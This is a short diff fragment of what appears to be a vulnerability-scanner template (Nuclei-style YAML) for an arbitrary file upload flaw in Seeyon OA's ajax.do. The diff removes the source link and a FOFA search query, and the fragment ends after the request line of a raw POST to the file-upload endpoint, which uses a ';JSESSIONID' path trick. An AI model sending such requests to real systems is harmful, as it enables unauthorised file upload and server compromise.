@@ -3,12 +3,8 @@ info:
   name: 致远OA ajax.do存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pu3pi4z87lxap67a'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pu3pi4z87lxap67a
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - 'POST /seeyon/ajax.do;JSESSIONID=chat?method=ajaxAction&managerName=fileToExcelManager&rnd=12700 HTTP/1.1
